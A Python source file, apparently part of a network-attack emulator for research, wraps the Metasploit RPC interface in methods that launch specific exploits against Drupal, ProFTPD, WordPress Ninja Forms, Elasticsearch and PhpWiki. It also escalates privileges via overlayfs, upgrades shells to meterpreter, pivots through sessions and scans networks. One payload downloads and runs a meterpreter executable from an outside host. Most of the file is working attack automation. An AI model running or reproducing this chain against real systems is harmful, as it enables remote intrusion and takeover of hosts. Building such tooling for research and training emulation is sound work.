# This is an interface to pymetasploit3, with the currently supported modules as methods and some helper functions.
# By default, the msfrcpd password is 'msfpassword'.

from nasimemu.pymetasploit3.msfrpc import MsfRpcClient
import time, re
import logging
from pprint import pprint

class MsfClient():
    def __init__(self, password, lhost, host='127.0.0.1', port=55553):
        self.logger = logging.getLogger("MsfClient")
        self.logger.info(f"Connecting to msfrpcd at {host}:{port}")
        self.client = MsfRpcClient(password, host=host, port=port, ssl=True)
        self.lhost = lhost

        # create a new console, use only one
        self.console = self.client.consoles.console()

    def get_sessions(self):
        return self.client.sessions.list

    # warning: user filtering not working as expected
    # sometimes the user field is populated incorrectly, especially after successful priviledge escalation
    # session_type: shell / meterpreter
    def get_sessions_filtered(self, ip=None, user=None, session_type=None):
        sessions = self.get_sessions()

        if ip is not None:
            sessions = {k: v for k, v in sessions.items() if v['target_host'] == ip}

        if user is not None:
            sessions = {k: v for k, v in sessions.items() if v['username'] == user}

        if session_type is not None:
            sessions = {k: v for k, v in sessions.items() if v['type'] == session_type}

        return sessions

    def run_shell_command(self, session_id, cmd, os="linux"):
        session = self.get_sessions()[str(session_id)]
        self.logger.info(f"Running `{cmd}` at #{session_id} ({session['session_host']})")

        session_cmd = self.client.sessions.session(str(session_id))

        if os == 'linux':
            command_string = f'{cmd}'
        elif os == 'windows':
            command_string = "cmd /c " + re.escape(f'{cmd} || echo error')
        else:
            raise RuntimeError(f"Unknown OS {os}.")

        result = self.run_module(
                module_type='post',
                module_name='multi/general/execute',
                module_params={'COMMAND': command_string, 'SESSION': int(session_id)}
        )

        def find_between(s, first, last):
            try:
                start = s.index(first) + len(first)
                end = s.index(last, start)
                return s[start:end]
            except ValueError:
                return ""

        result = find_between(result, '[*] Response: ', '[*] Post module execution completed')
        return result.rstrip()

    def wait_for_job(self, job_id, timeout=0):
        seconds_elapsed = 0

        while True:
            jobs = self.client.jobs.list

            if (timeout > 0) and (seconds_elapsed >= timeout):
                self.client.jobs.stop(job_id)
                return False

            if str(job_id) not in jobs.keys():
                return True

            time.sleep(1)
            seconds_elapsed += 1

    def get_session_id(self, result, rhost):
        result = [line for line in result.split('\n') if '[*] Session ' in line]

        if len(result) == 0:
            self.logger.info("No session created.")
            return None

        session_id = re.match(r".* Session (\d+) created .*", result[0]).group(1)
        self.logger.info(f"Opened new session #{session_id} for {rhost}")
        return session_id

    def run_module(self, module_type, module_name, module_params, payload_name=None, payload_params=None, forced_params=None, run_with_console=True):
        self.logger.info(f"Executing {module_type}:{module_name} with params {module_params}")

        module = self.client.modules.use(module_type, module_name)

        for pkey, pval in module_params.items():
            if pkey == 'target':
                module.target = pval
            else:
                module[pkey] = pval

        if payload_name is not None:
            payload = self.client.modules.use('payload', payload_name)
            for pkey, pval in payload_params.items():
                if pkey == 'encoder':
                    payload.runoptions[pkey] = pval
                else:
                    payload[pkey] = pval
        else:
            payload = None

        if forced_params is not None:
            for pkey, pval in forced_params.items():
                module._runopts[pkey] = pval

        if run_with_console:
            output = self.console.run_module_with_output(module, payload=payload, timeout=180)

            # print(output)
            self.logger.debug(output)
            return output

        else:
            job = module.execute(payload=payload)
            job_id = job['job_id']
            self.wait_for_job(job_id)

            return None

    def run_msf_command(self, cmd):
        self.logger.info(f"Executing msfconsole command: `{cmd}`")

        console = self.console
        console.read() # clear buffer
        console.write(cmd)

        output = ''
        timer = 0
        timeout = 300
        while output == '' or console.is_busy():
            time.sleep(5)
            output += console.read()['data']
            timer += 5
            if timer > timeout:
                break

        self.logger.debug(output)
        return output

    # create a route to the subnet via session_id (must be meterpreter)
    def add_route(self, ip, mask, session_id):
        cmd = f'route add {ip}/{mask} {session_id}'
        self.run_msf_command(cmd)

    def exploit_drupal_coder_exec(self, rhost):
        result = self.run_module(
                        module_type = 'exploit',
                        module_name = 'unix/webapp/drupal_coder_exec',
                        module_params = {'RHOSTS': rhost, 'TARGETURI': '/drupal'},
                        payload_name = 'cmd/unix/bind_netcat',
                        payload_params = {'LPORT': 8181},
                )

        return self.get_session_id(result, rhost)

    def exploit_proftpd_modcopy_exec(self, rhost):
        result = self.run_module(
                        module_type = 'exploit',
                        module_name = 'unix/ftp/proftpd_modcopy_exec',
                        module_params = {'RHOSTS': rhost, 'SITEPATH': '/var/www/uploads/', 'TARGETURI': '/uploads/'},
                        payload_name = 'cmd/unix/bind_perl',
                        payload_params = {'LPORT': 8181},
                )

        return self.get_session_id(result, rhost)

    def exploit_wp_ninja_forms_unauthenticated_file_upload(self, rhost):
        result = self.run_module(
                module_type = 'exploit',
                module_name = 'multi/http/wp_ninja_forms_unauthenticated_file_upload',
                module_params = {'RHOSTS': rhost, 'TARGETURI': '/wordpress/', 'FORM_PATH': 'index.php/king-of-hearts/', 'RPORT': '80', 'AllowNoCleanup': True},
                payload_name = 'php/download_exec',
                payload_params = {'URL': 'http://joo5dahp.wz.cz/7FxWg5fH.exe'}
                # this binary was generated with `msfvenom -p windows/meterpreter/bind_tcp  -f exe -o 7FxWg5fH.exe`
        )

        # start the handler
        result = self.run_module(
                        module_type = 'exploit',
                        module_name = 'multi/handler',
                        module_params = {},
                        payload_name = 'windows/meterpreter/bind_tcp',
                        payload_params = {'RHOST': rhost, 'LPORT': 4444},
                )

        return self.get_session_id(result, rhost)


    def exploit_elasticsearch_script_mvel_rce(self, rhost):
        result = self.run_module(
                module_type = 'exploit',
                module_name = 'multi/elasticsearch/script_mvel_rce',
                module_params = {'RHOSTS': rhost},
                payload_name = 'java/meterpreter/bind_tcp',
                payload_params = {'LPORT': 4444},
                forced_params =  {'LHOST': None}
        )

        return self.get_session_id(result, rhost)

    def exploit_phpwiki_ploticus_exec(self, rhost):
        result = self.run_module(
                        module_type = 'exploit',
                        module_name = 'multi/http/phpwiki_ploticus_exec',
                        module_params = {'RHOSTS': rhost, 'TARGETURI': '/phpwiki/'},
                        payload_name = 'generic/shell_bind_tcp',
                        payload_params = {'LPORT': 8181, 'encoder': 'php/base64'}
                )

        return self.get_session_id(result, rhost)

    def privesc_overlayfs_priv_esc(self, rhost, session_id):
        result = self.run_module(
                        module_type = 'exploit',
                        module_name = 'linux/local/overlayfs_priv_esc',
                        module_params = {'SESSION': session_id, 'target': 0}, # TODO: target maybe needs to be a property
                        payload_name = 'linux/x86/shell/bind_tcp',
                        payload_params = {'RHOST': rhost, 'LPORT': 8181},
                )

        return self.get_session_id(result, rhost)

    def post_shell_to_meterpreter(self, session_id):
        self.run_module(
                        module_type = 'post',
                        module_name = 'multi/manage/shell_to_meterpreter',
                        module_params = {'SESSION': session_id, 'LPORT': 8181, 'HANDLER': False, 'PAYLOAD_OVERRIDE': 'linux/x86/meterpreter/bind_tcp'} # works only on linux machines
                )

        time.sleep(5)

        # start the handler
        rhost = self.get_sessions()[str(session_id)]['target_host']
        result = self.run_module(
                        module_type = 'exploit',
                        module_name = 'multi/handler',
                        module_params = {},
                        payload_name = 'linux/x86/meterpreter/bind_tcp',
                        payload_params = {'RHOST': rhost, 'LPORT': 8181},
                )

        return self.get_session_id(result, rhost)

    def scan_portscan(self, rhosts, ports, threads=10):
        result = self.run_module(
                        module_type = 'auxiliary',
                        module_name = 'scanner/portscan/tcp',
                        module_params = {'RHOSTS': rhosts, 'PORTS': ports, 'THREADS': threads},
                )

        result = [line for line in result.split('\n') if 'TCP OPEN' in line]
        result = [re.match(r".*- ([\.\d:]+) - .*", x).group(1) for x in result]

        self.logger.info(f"Scan result: {result}")

        return result

    def scan_dir_scanner(self, rhosts, port, threads=1):
        result = self.run_module(
                module_type = 'auxiliary',
                module_name = 'scanner/http/dir_scanner',
                module_params = {'RHOSTS': rhosts, 'RPORT': port, 'THREADS': threads, 'DICTIONARY': '/vagrant/http_dir.txt'},
                run_with_console = True
        )
        result = [line for line in result.split('\n') if '[+] Found' in line and ' 200 ' in line]
        print(result)
        result = [re.match(r".*https?://.+/(.+)/ [0-9]+ .*", x).group(1) for x in result]

        self.logger.info(f"Folders found on the Http service: {result}")
        return result

    def scan_ping_sweep(self, rhosts, session_id):
        result = self.run_module(
                        module_type = 'post',
                        module_name = 'multi/gather/ping_sweep',
                        module_params = {'RHOSTS': rhosts, 'SESSION': session_id},
                )

        result = [line for line in result.split('\n') if 'host found' in line]
        result = [re.match(r".*\t([\.\d]+) .*", x).group(1) for x in result]

        self.logger.info(f"Scan result: {result}")
        return result

    def scan_os_smb(self, rhost):
        result = self.run_module(
                        module_type = 'auxiliary',
                        module_name = 'scanner/smb/smb_version',
                        module_params = {'RHOSTS': rhost},
                        run_with_console = True
        )
        nresult = []
        for line in result.split('\n'):
            if 'Host is running' in line:
                nresult.append('linux' if 'Samba' in line else 'windows' if 'Windows' in line else None)
            elif 'Host could not be identified:' in line:
                nresult.append('linux' if 'Samba' in line else 'windows' if re.search(r"Windows.*Windows", line) is not None else None)

        self.logger.info(f"Scan result: {nresult}")
        return nresult

    # def scan_os_nmap(self, rhost):
    #       output = self.run_msf_command(f"sudo nmap -O {rhost}") # TODO use of proxychains ??

    #       result = [line for line in output.split('\n') if line.startswith('Running:') ]
    #       nresult = []
    #       for line in result:
    #               if "Windows" in line:
    #                       nresult.append("windows")
    #               elif "Linux" in line:
    #                       nresult.append("linux")

    #       self.logger.info(f"Scan result: {nresult}")
    #       return nresult

    def get_os_by_cmd(self, session_id):
        if "Linux" in self.run_shell_command(session_id, "uname"):
            return "linux"

        if "Windows" in self.run_shell_command(session_id, "cmd /c ver", os='windows'): # doesn't work before windows 2000
            return "windows"

        if "Linux" in self.run_shell_command(session_id, "cat /proc/version"):
            return "linux"

        self.logger.warning(f"Os detection failed for session {session_id}")
        return None

    def is_session_meterpreter(self, session_id):
        sessions = self.get_sessions()
        if session_id not in sessions:
            self.logger.warning(f"Impossible to check session type, session {session_id} not found")
            return False

        return sessions[session_id]["type"] == 'meterpreter'

if __name__ == '__main__':
    # useful for testing
    # ------------------

    logging.basicConfig(level=logging.DEBUG)
    logging.getLogger('urllib3').setLevel(logging.INFO)

    import random

    msfclient = MsfClient('msfpassword', '192.168.0.100')
    
    msfclient.exploit_wp_ninja_forms_unauthenticated_file_upload('192.168.1.100')
    msfclient.exploit_wp_ninja_forms_unauthenticated_file_upload('192.168.1.100')
    # msfclient.exploit_elasticsearch_script_mvel_rce('192.168.1.100')

    # msfclient.exploit_drupal_coder_exec('192.168.1.101')
    # msfclient.exploit_proftpd_modcopy_exec('192.168.1.100')
    # msfclient.exploit_phpwiki_ploticus_exec('192.168.1.100')
    # msfclient.privesc_overlayfs_priv_esc('192.168.1.100', 3)
    # msfclient.post_shell_to_meterpreter('192.168.1.100', 8)